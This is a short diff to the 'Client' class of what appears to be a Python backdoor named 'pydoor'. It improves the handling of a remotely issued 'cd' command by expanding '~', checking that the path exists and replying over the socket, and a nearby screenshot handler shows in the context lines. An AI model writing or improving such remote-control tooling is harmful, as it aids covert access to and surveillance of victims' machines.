@@ -106,8 +106,20 @@ class Client:
                 s = ScreenshotHandler(self.sock)
 
             elif self.args[0] == "cd":
-                os.chdir(os.path.abspath(self.args[1]))
-                self.sock.send(b"pydoor_null")
+
+
+                if "~" in self.args[1]:
+                    dest = os.path.expanduser(self.args[1])
+                else:
+                    dest = self.args[1]
+
+
+                if os.path.exists(dest):
+                    os.chdir(os.path.abspath(dest))
+                    self.sock.send(b"pydoor_null")
+                else:
+                    self.sock.send(b"Invalid path")
+
 
 
                 
